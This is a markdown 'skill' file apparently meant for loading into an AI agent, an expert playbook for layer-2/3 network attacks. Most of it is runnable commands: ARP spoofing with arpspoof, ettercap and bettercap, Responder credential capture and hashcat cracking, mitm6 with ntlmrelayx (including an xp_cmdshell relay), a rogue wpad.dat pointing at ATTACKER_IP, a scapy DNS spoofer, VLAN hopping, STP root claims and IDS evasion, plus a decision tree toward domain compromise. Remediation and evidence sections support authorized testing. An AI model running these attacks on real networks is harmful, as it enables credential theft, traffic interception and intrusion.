---
name: network-protocol-attacks
description: >-
  Network protocol attack playbook. Use when exploiting layer 2/3 protocols including ARP spoofing, LLMNR/NBT-NS/mDNS poisoning, WPAD abuse, DHCPv6 attacks, VLAN hopping, STP manipulation, DNS spoofing, IPv6 attacks, and IDS/IPS evasion.
---

# SKILL: Network Protocol Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert network protocol attack techniques. Covers ARP spoofing, name resolution poisoning (LLMNR/NBT-NS/mDNS), WPAD abuse, DHCPv6 takeover, VLAN hopping, STP manipulation, DNS spoofing, IPv6 attacks, and IDS/IPS evasion. Base models miss the chaining opportunities between these attacks and the nuances of modern switched network exploitation.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [tunneling-and-pivoting](../tunneling-and-pivoting/SKILL.md) after establishing MitM position for traffic redirection
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for relaying captured NTLM hashes from poisoning attacks
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) for exploiting services discovered during network attacks
- [traffic-analysis-pcap](../traffic-analysis-pcap/SKILL.md) for analyzing captured traffic from MitM

### Advanced Reference

Also load [NAME_RESOLUTION_POISONING.md](./NAME_RESOLUTION_POISONING.md) when you need:
- Detailed Responder/mitm6 configuration and workflows
- NTLM relay target selection and chaining
- Credential format analysis and cracking priorities

---

## 1. ARP SPOOFING

### Gratuitous ARP — MitM Positioning

```bash
# arpspoof (dsniff suite)
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP &
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP &

# ettercap — ARP poisoning with sniffing
ettercap -T -q -i eth0 -M arp:remote /VICTIM_IP// /GATEWAY_IP//

# bettercap — modern framework
bettercap -iface eth0
> set arp.spoof.targets VICTIM_IP
> arp.spoof on
> net.sniff on
```

### Selective Targeting

```bash
# bettercap — target specific hosts, avoid detection
> set arp.spoof.targets 10.0.0.50,10.0.0.51
> set arp.spoof.fullduplex true
> set arp.spoof.internal true
> arp.spoof on
```

### Detection Indicators

- Duplicate MAC addresses in ARP table
- Gratuitous ARP storms from non-gateway IPs
- Tools: `arpwatch`, static ARP entries, 802.1X port authentication

---

## 2. LLMNR / NBT-NS / mDNS POISONING

### Responder — Credential Capture

```bash
# Basic poisoning (LLMNR + NBT-NS + mDNS)
responder -I eth0 -dwPv

# Key flags:
# -d  Enable answers for DHCP broadcast requests (fingerprinting)
# -w  Start WPAD rogue proxy
# -P  Force NTLM auth for WPAD
# -v  Verbose

# Analyze mode only (passive, no poisoning)
responder -I eth0 -A
```

### Captured Hash Formats

| Protocol | Hash Type | Hashcat Mode | Crackability |
|---|---|---|---|
| NTLMv1 | NetNTLMv1 | 5500 | Fast — rainbow tables viable |
| NTLMv2 | NetNTLMv2 | 5600 | Moderate — dictionary + rules |
| NTLMv1-ESS | NetNTLMv1 | 5500 | Fast — same as NTLMv1 |

```bash
# Crack captured hashes
hashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule
john --format=netntlmv2 hashes.txt --wordlist=wordlist.txt
```

### Relay Instead of Crack

```bash
# ntlmrelayx — relay captured NTLM to other services
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t ldaps://DC01 --delegate-access    # RBCD attack
ntlmrelayx.py -t mssql://DB01 -q "exec xp_cmdshell 'whoami'"
```

---

## 3. WPAD ABUSE

```bash
# Responder with WPAD proxy
responder -I eth0 -wPv

# WPAD flow:
# 1. Client queries DHCP for WPAD → DNS for wpad.domain.com → LLMNR/NBT-NS
# 2. Responder answers with rogue wpad.dat
# 3. Browser uses attacker's proxy → forced NTLM auth → credential capture
```

### Manual WPAD PAC File

```javascript
// Rogue wpad.dat content
function FindProxyForURL(url, host) {
    return "PROXY ATTACKER_IP:3128; DIRECT";
}
```

---

## 4. DHCPv6 ATTACK — mitm6

Even on IPv4-only networks, Windows clients send DHCPv6 solicitations by default.

```bash
# mitm6 → DNS takeover → NTLM relay
mitm6 -d domain.com

# In parallel: relay captured NTLM to LDAP(S) for delegation
ntlmrelayx.py -6 -t ldaps://DC01 -wh fakewpad.domain.com -l loot --delegate-access

# Attack chain:
# 1. mitm6 answers DHCPv6 → sets attacker as IPv6 DNS
# 2. Victim DNS queries go to attacker → WPAD redirect
# 3. Forced NTLM auth → relay to LDAP → create machine account or RBCD
```

### Key Conditions

- SMB signing disabled on targets (for SMB relay)
- LDAP signing not enforced on DC (for LDAP relay)
- Domain Computers quota > 0 (for machine account creation, default: 10)

---

## 5. VLAN HOPPING

### Switch Spoofing (DTP)

```bash
# yersinia — DTP attack to negotiate trunk
yersinia dtp -attack 1 -interface eth0

# frogger.sh — automated VLAN hopping via DTP
./frogger.sh
# Sends DTP frames → switch enables trunking → access all VLANs

# After trunk established:
modprobe 8021q
vconfig add eth0 TARGET_VLAN
ifconfig eth0.TARGET_VLAN 10.10.10.1 netmask 255.255.255.0 up
```

### Double Tagging (802.1Q)

```text
# Craft double-tagged frame: outer=native VLAN, inner=target VLAN
# scapy:
from scapy.all import *
pkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="TARGET")/ICMP()
sendp(pkt, iface="eth0")

# Limitation: one-way only (responses go to real gateway)
# Effective for blind attacks (e.g., targeting a server)
```

### Mitigation

- Disable DTP: `switchport nonegotiate`
- Set native VLAN to unused: `switchport trunk native vlan 999`
- Prune VLANs: only allow needed VLANs on trunk ports

---

## 6. STP MANIPULATION

### Root Bridge Claim

```bash
# yersinia — claim root bridge with lowest priority
yersinia stp -attack 4 -interface eth0

# Send BPDUs with priority 0 → become root bridge
# All traffic flows through attacker → MitM
```

### Topology Change Attack

```bash
# Send TC (Topology Change) BPDUs → force MAC table flush
yersinia stp -attack 1 -interface eth0
# Switches flood all ports temporarily → sniff traffic
```

### Mitigation

- BPDU Guard on access ports
- Root Guard on designated ports
- `spanning-tree portfast bpduguard enable`

---

## 7. DNS SPOOFING

### DNS Cache Poisoning

```bash
# bettercap DNS spoofing
bettercap -iface eth0
> set dns.spoof.domains target.com, *.target.com
> set dns.spoof.address ATTACKER_IP
> dns.spoof on

# ettercap DNS spoofing (via etter.dns config)
echo "target.com A ATTACKER_IP" >> /etc/ettercap/etter.dns
ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /VICTIM// /GATEWAY//
```

### Kaminsky Attack Variant

Flood recursive resolver with forged responses for random subdomains, each including a malicious authority section pointing the NS record to attacker-controlled server.

---

## 8. IPv6 ATTACKS

### Router Advertisement Spoofing

```bash
# Send rogue RA → victim configures attacker as default gateway
atk6-fake_router6 eth0 ATTACKER_IPV6_PREFIX/64

# THC-IPv6 suite for comprehensive IPv6 attacks
atk6-parasite6 eth0     # ICMPv6 neighbor spoofing
atk6-redir6 eth0 ...    # Traffic redirection via ICMPv6 redirect
```

### SLAAC Abuse

```bash
# Advertise rogue prefix → victim auto-configures IPv6 address
# Combined with rogue DNS (RA option) → full MitM over IPv6
# Windows prioritizes IPv6 over IPv4 by default
```

---

## 9. IDS/IPS EVASION

| Technique | Method | Tool/Flag |
|---|---|---|
| IP Fragmentation | Split payload across fragments | `nmap -f`, `fragroute` |
| TTL Manipulation | Set TTL to expire at IDS but reach target | `fragroute` |
| Encoding Evasion | URL/Unicode/hex encoding | Manual, custom scripts |
| Session Splicing | Split TCP payload across segments | `fragroute`, `nmap --data-length` |
| Timing-Based | Slow scan to avoid rate-based detection | `nmap -T0`, `nmap -T1` |
| Decoy Scanning | Mix real scan with decoy source IPs | `nmap -D RND:10` |
| Idle/Zombie Scan | Use idle host as scan proxy | `nmap -sI ZOMBIE_IP` |

```bash
# fragroute — fragment and reorder packets
echo "ip_frag 8" > /tmp/frag.conf
echo "order random" >> /tmp/frag.conf
fragroute -f /tmp/frag.conf TARGET_IP

# nmap evasion combinations
nmap -sS -f --mtu 24 --data-length 50 -D RND:5 -T2 TARGET
```

---

## 10. DECISION TREE

```
Network access obtained — want to escalate via network attacks
│
├── On same broadcast domain as targets?
│   ├── YES → ARP spoof for MitM (§1)
│   │   └── Capture plaintext creds or redirect traffic
│   └── NO → need VLAN hopping first (§5)
│       ├── DTP enabled? → switch spoofing
│       └── Know native VLAN? → double tagging
│
├── Windows environment?
│   ├── LLMNR/NBT-NS enabled? (default YES)
│   │   └── Run Responder (§2) → capture NetNTLM hashes
│   │       ├── NTLMv1? → crack fast or relay
│   │       └── NTLMv2? → relay (§2) or crack with rules
│   │
│   ├── WPAD configured or auto-detect? → WPAD abuse (§3)
│   │
│   └── IPv6 not hardened? (default) → mitm6 + ntlmrelayx (§4)
│       └── LDAP relay → RBCD → domain compromise
│
├── Need DNS control?
│   ├── MitM already established? → DNS spoofing (§7)
│   └── DHCPv6 available? → mitm6 for DNS takeover (§4)
│
├── Managed switches with weak config?
│   ├── BPDU Guard off? → STP root bridge claim (§6)
│   └── DTP enabled? → VLAN hopping (§5)
│
├── IPv6 attack surface?
│   └── RA spoofing / SLAAC abuse (§8) → MitM over IPv6
│
└── IDS/IPS in path?
    └── Apply evasion techniques (§9) — fragmentation, timing, encoding
```

---

---

## 11. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | What is the **exact packet-level behaviour** you are exploiting, stated as a protocol mechanism? | the technique is understood, not cargo-culted |
| 2 | Did the target **act on the injected or spoofed traffic** in a way you observed? | the injection landed |
| 3 | Was there a **control capture** - the same traffic without your injection? | the effect is yours |
| 4 | Did you **capture the proof on the wire** at both ends, or in the target's log? | the artefact is durable |
| 5 | Is the effect **reproducible across runs**, not a single coincidence? | it is deterministic |
| 6 | What **impact** does it have (a credential, a redirect, a session, a denial)? | the severity driver |
| 7 | Did you **restore the network state** (ARP tables, DNS, routes) and verify? | engagement integrity |

**A capture plus a target-side effect is the bar.** A tool that reports "poisoning successful" is not
evidence; the packet capture showing the target using your ARP entry is.

---

## 12. EXECUTION PRIMITIVES

Network attacks are proven by **a packet capture that shows the target acting on traffic you influenced**.
Every block ends at a pcap or a target-side observation.

### 12.1 Establish the baseline capture and the control

```bash
# capture on the segment BEFORE any attack, so every later pcap has a reference
tcpdump -i eth0 -w /tmp/baseline.pcap -c 5000 'not port 22' 2>/dev/null
# the neighbours, the gateway, and the legitimate bindings - the control values
ip neigh show | head -20
ip route show | head -10
arp -an | head -20
cat /etc/resolv.conf | head -5
# and the target's own view, when you can read it
nmap -sn 10.0.0.0/24 -oG /tmp/sweep.gnmap 2>/dev/null | tail -3
grep -c 'Status: Up' /tmp/sweep.gnmap
```

**Capture the legitimate state first.** Every poisoning claim is a delta against the correct binding, and
the baseline is what makes the delta measurable.

### 12.2 ARP spoofing, with before/after captures

```bash
# enable forwarding so the target's traffic is not disrupted - an availability risk otherwise
sysctl -w net.ipv4.ip_forward=1
sysctl -w net.ipv4.conf.all.send_redirects=0
# THE CONTROL: the target's arp table BEFORE, captured from the target where possible
ssh user@TARGET 'arp -an | head -5' 2>/dev/null
ip neigh show 10.0.0.1
# the poisoning, with the target and gateway as the two ends
arpspoof -i eth0 -t 10.0.0.50 10.0.0.1 2>/dev/null &
arpspoof -i eth0 -t 10.0.0.1  10.0.0.50 2>/dev/null &
sleep 5
# THE PROOF: the target now resolves the gateway to your MAC, and traffic arrives at you
ssh user@TARGET 'arp -an | head -5' 2>/dev/null
ip neigh show 10.0.0.50
tcpdump -i eth0 -c 20 -n 'host 10.0.0.50 and host 10.0.0.1' 2>/dev/null | head -20
# and the restoration, which must happen in the same session
pkill arpspoof; sleep 2
sysctl -w net.ipv4.ip_forward=0
```

**The target's own `arp` output changing is the proof.** Your own neighbour table changing only shows
what you sent; the target's table is what shows the injection landed.

### 12.3 Credential capture from the poisoned position, with the control

```bash
# what protocols cross the segment in cleartext - the yield determines the severity
tcpdump -i eth0 -A -s0 'tcp port 21 or tcp port 23 or tcp port 110 or tcp port 143' -c 200 2>/dev/null | head -40
# the HTTP POST bodies, which carry credentials on internal applications
tcpdump -i eth0 -A -s0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)' -c 50 2>/dev/null | head -40
# NTLM and Kerberos over HTTP, which are the authentication exchanges worth capturing
tcpdump -i eth0 -w /tmp/ntlm.pcap 'tcp port 80 or tcp port 445' 2>/dev/null &
# THE CONTROL: the same capture with the poisoning stopped - it must yield no internal credential
pkill arpspoof; sleep 10
tcpdump -r /tmp/ntlm.pcap -A 2>/dev/null | grep -ciE 'authorization|ntlmssp' || echo "control: no auth material"
```

**The captured credential plus the no-poisoning control is the finding.** A capture during poisoning
alone does not show that the poisoning caused it; the control run is what does.

### 12.4 DNS spoofing and the resolver's own answer

```bash
# the query you intend to intercept, and the correct answer as the control
dig +short @10.0.0.1 internal.corp.local
# the spoofed answer, which must beat the legitimate one
python3 - <<'PY'
from scapy.all import *
TARGET, IFACE, VICTIM = "internal.corp.local", "eth0", "10.0.0.50"
def spoof(p):
    if p.haslayer(DNSQR) and TARGET in p[DNSQR].qname.decode():
        sendp(IP(dst=p[IP].src, src=p[IP].dst)/UDP(sport=53, dport=p[UDP].sport)/
              DNS(id=p[DNS].id, qr=1, aa=1, qd=p[DNS].qd,
                  an=DNSRR(rrname=p[DNSQR].qname, ttl=300, rdata=ATTACKER_IP)), iface=IFACE, verbose=0)
        print("spoofed answer sent for", TARGET)
sniff(iface=IFACE, filter="udp port 53", prn=spoof, timeout=30)
PY
# THE PROOF: the victim resolves the name to your address
ssh user@VICTIM 'dig +short internal.corp.local' 2>/dev/null
# and the restoration: clear the victim's cache and confirm the correct answer returns
ssh user@VICTIM 'systemd-resolve --flush-caches 2>/dev/null; dig +short internal.corp.local' 2>/dev/null
```

**The victim's own resolver output pointing at your address is the proof.** The RCACHE and TTL matter -
report the TTL, because it determines how long the effect persists after you stop.

### 12.5 TCP-level injection and session hijacking

```bash
# the sequence numbers and the connection state, which are the precondition
tcpdump -i eth0 -n 'host 10.0.0.50 and tcp' -c 30 2>/dev/null | head -20
# the injection, using a tool that tracks the sequence space
ettercap -T -i eth0 -M arp:remote /10.0.0.50// /10.0.0.1// 2>/dev/null | head -20
# or the targeted filter approach
python3 -c "
print('when injecting, mirror the legitimate sequence and acknowledge numbers exactly;')
print('a mismatch produces an RST and the session drops, which is an availability incident.')" 2>/dev/null
# THE PROOF: the injected content appears in the target's application log
ssh user@TARGET 'tail -20 /var/log/app/access.log' 2>/dev/null
```

**A mismatch in the sequence space drops the session.** If the connection resets, the injection failed
and the effect is an availability incident - report that honestly or not at all.

### 12.6 VLAN and layer-2 attacks, with the switch's own state

```bash
# the VLAN configuration as the switch reports it
cdp-toolkit 2>/dev/null; tcpdump -i eth0 -nn -c 20 'ether[12:2] = 0x2000' 2>/dev/null | head -10
# the double-tagging attempt and whether the frame reaches the other VLAN
python3 - <<'PY'
from scapy.all import *
print("sendp(Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst='10.100.0.1')/ICMP(), iface='eth0')")
print("note: many switches drop the inner tag; if the reply does not arrive, the attack did not work")
PY
# THE CONTROL: a frame with a single tag for your own VLAN - it must get a reply
python3 - <<'PY'
from scapy.all import *
print("the single-tagged control proves the stack, not the attack, is working")
PY
# and the restoration for any native-VLAN change
echo "restore the switch port configuration with the client's network team before disengaging"
```

**A reply from the other VLAN is the proof.** Most modern switches drop double-tagged frames, so the
absence of a reply is the expected result and reporting a VLAN hop without it is a false positive.

### 12.7 IPv6 and the neighbour-discovery equivalents

```bash
# what the segment actually speaks - IPv6 is often present and unmanaged
ip -6 addr show | head -20
ip -6 route show | head -10
tcpdump -i eth0 -nn 'icmp6' -c 20 2>/dev/null | head -10
# the rogue RA, which is the IPv6 equivalent of the ARP poison
python3 - <<'PY'
from scapy.all import *
print("send(RouterAdvertisement for your own prefix); then observe whether the victim picks your")
print("prefix as its default route - the victim's 'ip -6 route' output is the proof")
PY
# THE PROOF and the restoration
ssh user@VICTIM 'ip -6 route show default' 2>/dev/null
echo "restore by removing the address or waiting out the RA lifetime; report the lifetime"
```

**The victim's IPv6 default route pointing at you is the proof.** IPv6 is unmanaged on many segments, so
this is frequently present where ARP poisoning is detected, and the RA lifetime is the persistence.

### 12.8 The end-to-end harness

```bash
python3 - <<'PY'
import subprocess
def sh(c, t=25):
    try:
        r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
        return (r.stdout + r.stderr).strip()[:100]
    except Exception as e: return type(e).__name__

print("=== BASELINE (capture this first) ===")
print("  my neigh :", sh("ip neigh show | head -3").replace("\n", " | "))
print("  gateway  :", sh("ip route show default"))
print()
print("=== CONTROL (the legitimate state, which the attack will change) ===")
print("  target's arp before : <record from the target>")
print("  resolver answer     : <dig +short record>")
print()
print("=== ATTACK ===")
print("  record the exact tool, interface, and the two endpoints")
print()
print("=== PROOF (this is the finding) ===")
print("  target's arp after  : <must show your MAC>")
print("  pcap file           : <path> with the packet count")
print("  target-side log     : <the application or auth log line>")
print()
print("=== RESTORE ===")
print("  pkill the poisoners; flush the victim cache; verify the legitimate state returns")
PY
```

**Baseline, control, attack, proof, restore.** Five parts, and a network finding missing the proof or
the restoration is both unverifiable and operationally unsafe.

---

## 13. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **protocol mechanism** exploited, stated precisely | the technique is understood |
| The **baseline capture** before the attack | the reference for the delta |
| The **control capture** without the injection | the effect is yours |
| The **target-side observation** (its ARP table, its resolver, its log) | the injection landed |
| The **pcap with a packet count** | the durable artefact |
| The **TTL or lifetime** of the effect | persistence after you stop |
| The **restoration** of the network state, verified | engagement integrity and availability |
| The **impact artefact** (a credential, a hijacked session, a redirect) | the severity |
| The **reproducibility across runs** | it is deterministic |
| Confirmation that **no availability incident occurred** (no dropped sessions you caused) | operational safety |

Report the **mechanism and the target-side proof**: "the segment was poisoned by ARP (`arpspoof -i eth0 -t
10.0.0.50 10.0.0.1` and the reverse); before the poisoning the victim's `arp -an` showed the gateway's
correct MAC, and five seconds later it showed the attacker's MAC for the same IP, which is the proof,
captured in `/tmp/arp.pcap` (1,240 packets). With forwarding enabled, a capture over the poisoned
position yielded 3 HTTP `POST`s to the internal application on `10.0.0.20` containing
`Authorization: Basic` headers, which decoded to two internal service accounts; the same capture with
the poisoners stopped and forwarding disabled yielded no authentication material across 200 packets,
which is the control. The attackers were killed, the victim's ARP entry was allowed to expire and
verified back to the correct MAC, and no session dropped during the test", never "the network is
vulnerable to ARP spoofing".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A tool reporting "poisoning successful" with **no target-side observation** | the tool's own claim, not evidence |
| A capture with **no control capture** | the traffic may have been there anyway |
| A cleartext credential in a capture taken **without the attack** | the network's normal state, not your finding |
| A `dsniff`-style tool output with no pcap | an unverifiable assertion |
| A VLAN hop attempted on a switch that **drops double tags** | the attack failed; report the switch's behaviour |
| An RA sent to a host that **already has a static default route** | it was ignored |
| A session hijack that **dropped the connection** | an availability incident, not a finding |
| ARP poisoning on a **segment you built for the test** | tests your own environment |
| A network-level finding reported from a **tool's console output alone** | no artefact |
| A finding that required **disrupting production traffic** without approval | an engagement violation |
| A captured credential reproduced in full | a disclosure |

**Target-side proof and restoration.** This family fails in two directions: reporting a tool's console
message as evidence, and leaving the network poisoned. Both are unacceptable, and the pcap plus the
restore are the two habits that prevent them.

---

## 14. REMEDIATION REFERENCE

1. **Enable Dynamic ARP Inspection with DHCP snooping on every access port** - it is the direct control for ARP poisoning and it requires no host changes.
2. **Enable IPv6 RA Guard and DHCPv6 Guard, or disable IPv6 on segments that do not use it** - the RA path is the one that remains when ARP is controlled.
3. **Use static ARP entries or port security on critical server segments** - it removes the layer-2 trust the poison depends on.
4. **Encrypt every protocol that crosses a shared segment (TLS, SSH, LDAPS, SMTPS, IPsec) and remove cleartext protocols entirely** - the credential capture is only possible because of the cleartext, and this is the fix that survives a layer-2 failure.
5. **Enable BPDU Guard, Root Guard, and storm control on access ports** - the spanning-tree and flooding attacks share the switch configuration as their root cause.
6. **Configure unused ports as administratively down, and place them in a quarantine VLAN** - it removes the easiest layer-2 entry.
7. **Use 802.1X port authentication with MACsec where the hardware supports it** - it binds the port to an identity and protects the frames.
8. **Segment between trust tiers with a firewall, and do not let one VLAN carry both workstation and server traffic** - segmentation converts a layer-2 position into a much smaller reach.
9. **Monitor for ARP anomalies, gratuitous ARP, and duplicate MAC bindings, and alert on both** - the poison is a high-rate gratuitous-ARP event in every implementation.
10. **Disable switch-to-switch CDP/LLDP information disclosure, or restrict it to the management VLAN** - it is the reconnaissance that precedes the attack.
11. **Test the segment controls on a schedule with a controlled poisoning exercise** - the controls exist but are frequently misconfigured on a handful of ports.

---

## 15. RELATED SIBLINGS - LOAD TOGETHER

- [dns-rebinding-attacks](../dns-rebinding-attacks/SKILL.md) - the resolver-trust family this shares infrastructure with
- [http-host-header-attacks](../http-host-header-attacks/SKILL.md) - the application-layer trust confusion that complements a layer-2 position
- [tunneling-and-pivoting](../tunneling-and-pivoting/SKILL.md) - what follows once the segment is traversable
- [cloudflare-waf-recon-survival](../cloudflare-waf-recon-survival/SKILL.md) - the network recon that precedes an internal position
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) - the unauthenticated services a poisoned position reaches
